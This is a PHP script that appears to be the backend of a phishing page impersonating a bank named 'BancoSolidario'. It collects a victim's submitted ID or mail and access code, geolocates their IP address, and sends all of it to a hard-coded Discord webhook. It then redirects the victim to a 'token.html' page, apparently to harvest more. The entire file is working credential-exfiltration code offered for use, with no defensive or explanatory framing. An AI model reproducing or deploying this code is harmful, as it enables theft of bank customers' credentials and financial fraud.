<?php
if (isset($_POST["dni"]) && isset($_POST["cpass"])) {
    // Limpieza de datos recibidos
    $dni = htmlspecialchars($_POST["dni"]);
    $cpass = htmlspecialchars($_POST["cpass"]);

    // Obtener la IP del cliente
    $ip_cliente = $_SERVER["REMOTE_ADDR"];

    // Obtener información de ubicación por IP
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/" . $ip_cliente);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $ip_data_in = curl_exec($ch);
    curl_close($ch);

    $ip_data = json_decode($ip_data_in, true);
    $country = isset($ip_data["country"]) ? $ip_data["country"] : "Desconocido";
    $city = isset($ip_data["city"]) ? $ip_data["city"] : "Desconocida";
    $ip_cliente = isset($ip_data["query"]) ? $ip_data["query"] : $ip_cliente;

    // Tu webhook de Discord (⚠️ reemplaza por uno nuevo generado)
    $webhook_url = "https://discordapp.com/api/webhooks/1413637036505829396/sdOGysqTEROkoDEupDgo6TecTos3RyNhRdYfxwPBi-HsK6m0iJd3YBzaVU8At0fy4Puq";

    // Construir mensaje
    $mensaje = "🛒 **BancoSolidario - Mail**\n".
               "**Mail:** $dni\n".
               "**Código:** $cpass\n".
               "**IP:** $ip_cliente\n".
               "**Ciudad:** $city\n".
               "**País:** $country";

    // Crear payload JSON
    $data = json_encode([
        "content" => $mensaje
    ]);

    // Enviar mensaje a Discord
    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Redirigir al usuario
    echo "<script>";
    echo "window.location.href='token.html';";
    echo "</script>";
    exit();
}
?>
